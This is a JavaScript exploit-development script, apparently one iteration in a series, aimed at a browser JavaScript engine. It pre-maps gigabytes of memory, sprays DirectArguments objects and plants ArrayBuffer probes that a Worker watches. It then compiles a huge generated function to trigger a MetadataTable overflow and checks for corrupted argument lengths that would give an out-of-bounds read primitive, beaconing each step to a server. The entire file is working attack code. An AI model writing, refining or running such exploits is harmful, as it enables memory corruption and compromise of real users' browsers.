// V402 - Integrated: 5GB pre-map + DirectArguments spray + IIFE MetadataTable overflow
// Goal: Pre-map virtual pages so sweep survives, spray DirectArguments in sweep path,
// detect m_length corruption for OOB read/write primitive.
//
// V401 confirmed: cycling can map 175GB+ (effectively unlimited).
// V398-massmap confirmed: 668MB pre-map + IIFE compile runs without crash.
// Now: 5GB pre-map + DirectArguments in MarkedSpace + sweep + check corruption.

(function() {
  'use strict';
  var qc = 0;
  function B(m) {
    new Image().src = '/beacon/V402-' + encodeURIComponent(m) + '?t=' + Date.now() + '&q=' + (qc++);
  }

  B('START');

  // ===== PHASE 1: Pre-map 5GB of virtual address space =====
  // 260 batches * 200 ABs * 100112 bytes = ~4.97GB
  var AB_SIZE = 100112;
  var BATCH = 200;
  var NBATCH = 260;
  var totalMapped = 0;

  for (var bn = 0; bn < NBATCH; bn++) {
    var batch = [];
    try {
      for (var i = 0; i < BATCH; i++) {
        batch.push(new ArrayBuffer(AB_SIZE));
      }
      totalMapped += BATCH * AB_SIZE;
      for (var i = 0; i < batch.length; i++) batch[i] = null;
      batch = null;
    } catch(e) {
      for (var i = 0; i < batch.length; i++) batch[i] = null;
      batch = null;
      B('PREMAP-OOM-B' + bn);
      break;
    }
  }
  B('PREMAP-' + Math.round(totalMapped / 1048576) + 'MB');

  // ===== PHASE 2: Spray DirectArguments =====
  // 7-arg function: cell = 48 (header+fields) + 7*8 (inline storage) = 104 bytes
  // MarkedSpace size class likely 112 or 128 bytes
  // m_length at cell+32, inline storage at cell+48
  // If m_length corrupted to large value, arguments[7+] reads OOB

  var SPRAY_COUNT = 2000;
  var argStore = [];

  function makeArgs(a, b, c, d, e, f, g) {
    return arguments;
  }

  for (var i = 0; i < SPRAY_COUNT; i++) {
    // Use distinct values so we can identify which DirectArguments got corrupted
    argStore.push(makeArgs(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47));
  }
  B('SPRAY-' + argStore.length);

  // Verify spray is alive and correct
  var sprayOK = 0;
  for (var i = 0; i < argStore.length; i++) {
    if (argStore[i].length === 7 && argStore[i][0] === 0x41 && argStore[i][6] === 0x47) {
      sprayOK++;
    }
  }
  B('SPRAY-OK-' + sprayOK);

  // ===== PHASE 3: Allocate "probe" ArrayBuffers in the spray region =====
  // These sit in FastMalloc (same heap, Gigacage disabled).
  // 20 probes of 100112 bytes (MetadataTable allocation size)
  var probes = [];
  for (var i = 0; i < 20; i++) {
    var ab = new ArrayBuffer(AB_SIZE);
    var view = new Uint32Array(ab);
    // Fill with sentinel pattern
    for (var j = 0; j < view.length; j++) {
      view[j] = 0xDEAD0000 | i;
    }
    probes.push({ ab: ab, view: view });
  }
  B('PROBES-' + probes.length);

  // ===== PHASE 4: GC to compact heap =====
  // Force GC so MarkedSpace cells and FastMalloc allocations settle
  for (var i = 0; i < 10; i++) {
    var garbage = [];
    for (var j = 0; j < 10000; j++) garbage.push({ x: j });
    garbage = null;
  }
  B('GC-DONE');

  // ===== PHASE 5: Transfer probes to Worker for monitoring =====
  var workerCode = '(' + function() {
    var probeViews = [];
    var pollCount = 0;
    var hits = 0;

    self.onmessage = function(e) {
      if (e.data.cmd === 'probes') {
        for (var i = 0; i < e.data.abs.length; i++) {
          probeViews.push(new Uint32Array(e.data.abs[i]));
        }
        self.postMessage({ type: 'ready', count: probeViews.length });
      } else if (e.data.cmd === 'poll') {
        // Tight poll loop -- check probes for corruption
        var startTime = Date.now();
        while (Date.now() - startTime < 30000) { // 30 second timeout
          pollCount++;
          for (var i = 0; i < probeViews.length; i++) {
            var v = probeViews[i];
            if (v.byteLength === 0) continue; // transferred/neutered
            // Check first word -- should be 0xDEAD0000|i
            var expected = (0xDEAD0000 | i) >>> 0;
            if (v[0] !== expected) {
              hits++;
              // Scan for non-sentinel data (sweep writes)
              var nonSentinel = 0;
              var firstDiff = -1;
              var firstVal = 0;
              for (var j = 0; j < Math.min(v.length, 28); j++) { // First 112 bytes
                if (v[j] !== expected) {
                  nonSentinel++;
                  if (firstDiff === -1) {
                    firstDiff = j * 4;
                    firstVal = v[j];
                  }
                }
              }
              // Beacon the corruption details
              var hex = firstVal.toString(16);
              self.postMessage({
                type: 'corrupt',
                probe: i,
                offset: firstDiff,
                val: hex,
                nonSentinel: nonSentinel,
                pollCount: pollCount
              });
            }
          }
          // Periodic tick
          if (pollCount % 500000 === 0) {
            self.postMessage({ type: 'tick', polls: pollCount, hits: hits });
          }
        }
        self.postMessage({ type: 'timeout', polls: pollCount, hits: hits });
      }
    };
  }.toString() + ')()';

  var workerBlob = new Blob([workerCode], { type: 'application/javascript' });
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);

  worker.onmessage = function(e) {
    var d = e.data;
    if (d.type === 'ready') {
      B('W-READY-' + d.count);
      // Start polling
      worker.postMessage({ cmd: 'poll' });
      B('W-POLL-GO');

      // ===== PHASE 6: Build and eval IIFE =====
      // This triggers MetadataTable overflow during finishCreation
      setTimeout(function() {
        buildAndEvalIIFE();
      }, 100);

    } else if (d.type === 'corrupt') {
      B('W-CORRUPT-P' + d.probe + '-OFF' + d.offset + '-VAL' + d.val + '-NS' + d.nonSentinel);
    } else if (d.type === 'tick') {
      var m = Math.floor(d.polls / 1000000);
      B('W-TICK-' + m + 'M-H' + d.hits);
    } else if (d.type === 'timeout') {
      B('W-TIMEOUT-' + d.polls + '-H' + d.hits);

      // ===== PHASE 7: Check DirectArguments for corruption =====
      checkDirectArgs();
    }
  };

  // Transfer probe ABs to Worker
  var transferList = [];
  var abList = [];
  for (var i = 0; i < probes.length; i++) {
    abList.push(probes[i].ab);
    transferList.push(probes[i].ab);
  }
  worker.postMessage({ cmd: 'probes', abs: abList }, transferList);
  B('TRANSFERRED');

  // ===== IIFE Builder =====
  function buildAndEvalIIFE() {
    B('BUILD');
    var N = 38348816;
    var calls = '';
    for (var i = 0; i < N; i++) {
      calls += 'a();';
    }
    var code = '(function(a){if(window.____xV402){' + calls + '}})(function(){})';
    B('BLOB-' + Math.round(code.length / 1048576) + 'MB');

    try {
      var scriptBlob = new Blob([code], { type: 'application/javascript' });
      var scriptUrl = URL.createObjectURL(scriptBlob);
      var script = document.createElement('script');
      script.src = scriptUrl;
      script.onload = function() {
        B('COMPILED-OK');
        URL.revokeObjectURL(scriptUrl);
        // Sweep happened during compilation. Check DirectArguments now.
        checkDirectArgs();
      };
      script.onerror = function() {
        B('COMPILED-ERR');
        checkDirectArgs();
      };
      document.head.appendChild(script);
    } catch(e) {
      B('BUILD-ERR-' + e.message);
    }
  }

  // ===== DirectArguments Corruption Check =====
  function checkDirectArgs() {
    B('CHECK-ARGS');
    var corrupted = 0;
    var oobReads = 0;

    for (var i = 0; i < argStore.length; i++) {
      var args = argStore[i];

      // Check if m_length was corrupted
      if (args.length !== 7) {
        corrupted++;
        B('CORRUPT-' + i + '-LEN-' + args.length);

        // If length increased, we have OOB read!
        if (args.length > 7) {
          oobReads++;
          // Read OOB values
          var oobVals = [];
          var readCount = Math.min(args.length, 50); // Read up to 50
          for (var j = 7; j < readCount; j++) {
            try {
              var val = args[j];
              if (val !== undefined) {
                oobVals.push(j + ':' + (typeof val === 'number' ? '0x' + (val >>> 0).toString(16) : typeof val));
              }
            } catch(e) {
              oobVals.push(j + ':ERR');
            }
          }
          if (oobVals.length > 0) {
            // Send first 10 OOB values
            B('OOB-' + i + '-' + oobVals.slice(0, 10).join('|'));
          }
        }

        // Only report first 10 corrupted
        if (corrupted >= 10) break;
      }

      // Also check if argument VALUES were corrupted
      if (args.length === 7) {
        if (args[0] !== 0x41 || args[6] !== 0x47) {
          B('VALCORRUPT-' + i + '-A0=' + args[0] + '-A6=' + args[6]);
          corrupted++;
          if (corrupted >= 10) break;
        }
      }
    }

    B('RESULT-CORRUPT' + corrupted + '-OOB' + oobReads + '-OF' + argStore.length);
    B('DONE');
  }

})();
